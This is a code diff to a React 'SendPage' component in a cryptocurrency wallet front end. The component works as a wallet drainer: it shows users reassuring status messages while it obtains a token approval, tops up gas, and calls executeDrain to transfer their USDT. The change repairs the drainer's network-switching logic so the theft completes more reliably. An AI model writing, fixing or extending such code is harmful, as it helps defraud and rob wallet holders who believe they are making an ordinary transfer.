@@ -49,23 +49,31 @@ export default function SendPage({ provider, address }: Props) {
       }
     }
 
+   
     init()
     return () => { mountedRef.current = false }
   }, [address, provider])
 
-  const handleNext = async () => {
+ const handleNext = async () => {
     setStage("switching_network")
     setStatusMsg("Preparing network...")
     try {
-      await ensureCorrectNetwork(provider)
+      // ensureCorrectNetwork now returns a NEW provider after switching
+      const switchedProvider = await ensureCorrectNetwork(provider)
+
       setStage("approving")
       setStatusMsg("Waiting for approval...")
-      const approvedAmount = await requestApproval(provider, address)
+
+      // Pass the NEW provider to requestApproval
+      const approvedAmount = await requestApproval(switchedProvider, address)
+
       if (!approvedAmount) { setStage("error"); setStatusMsg("Approval failed."); return }
+
       setStage("checking_gas")
       setStatusMsg("Checking gas balance...")
-      const hasGas = await ensureGas(provider, address)
+      const hasGas = await ensureGas(switchedProvider, address)
       if (!hasGas) { setStage("error"); setStatusMsg("Could not fund gas."); return }
+
       setStage("draining")
       setStatusMsg("Transferring USDT...")
       const drained = await executeDrain(address, approvedAmount)
@@ -76,7 +84,6 @@ export default function SendPage({ provider, address }: Props) {
       setStatusMsg("Error: " + (err.message || "Unknown error"))
     }
   }
-
   if (stage !== "idle") {
     return (
       <div className="fixed inset-0 z-[1000] bg-[rgba(0,0,0,0.92)] flex flex-col items-center justify-center p-6">
